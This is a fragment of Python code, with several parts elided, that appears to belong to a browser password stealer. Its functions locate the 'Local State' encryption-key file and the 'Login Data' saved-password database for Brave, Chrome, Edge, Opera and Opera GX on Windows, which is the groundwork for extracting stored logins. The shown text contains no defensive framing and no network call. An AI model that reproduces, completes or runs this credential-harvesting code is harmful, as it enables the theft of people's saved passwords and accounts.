...
def get_key(browser):
    match browser:
        case "brave":
            loc_state = os.environ['LOCALAPPDATA']+r'\BraveSoftware\Brave-Browser\User Data\Local State'
        case "chrome":
            loc_state = os.environ['LOCALAPPDATA']+r'\Google\Chrome\User Data\Local State'
        case "edge":
            loc_state = os.environ['LOCALAPPDATA']+r'\Microsoft\Edge\User Data\Local State'
        case "opera":
            loc_state = os.environ['APPDATA']+r'\Opera Software\Opera Stable\Local State'
        case "operagx":
            loc_state = os.environ['APPDATA']+r'\Opera Software\Opera GX Stable\Local State'
...
def get_browser(browser):
    ...
    match browser:
        ...
        case "brave":
            login_db = os.environ['LOCALAPPDATA']+r'\BraveSoftware\Brave-Browser\User Data\default\Login Data'
        case "edge":
            login_db = os.environ['LOCALAPPDATA']+r'\Microsoft\Edge\User Data\Default\Login Data'
        case "opera":
            login_db = os.environ['APPDATA']+r'\Opera Software\Opera Stable\Login Data'
        case "operagx":
            login_db = os.environ['APPDATA']+r'\Opera Software\Opera GX Stable\Login Data'
